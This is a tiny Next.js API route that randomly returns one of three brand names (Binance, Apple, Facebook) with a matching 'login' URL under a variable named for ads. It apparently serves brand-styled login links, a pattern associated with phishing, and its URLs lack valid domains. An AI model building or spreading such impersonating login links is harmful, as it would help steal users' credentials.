// Next.js API route support: https://nextjs.org/docs/api-routes/introduction

export default function handler(req, res) {

  var randomize = [
    "Binance",
    "Apple",
    "Facebook"
  ];

  var dict = {
    Binance: "loginbinance",
    Apple: "loginapple",
    Facebook: "loginfacebook"
  };

  var select_ads_data = randomize[Math.floor(Math.random()*randomize.length)];
  const select = select_ads_data
  var url = dict[select];

  res.status(200).json({ 
    
    Company: select_ads_data,
    url: 'https://' + url,
  
  })
}
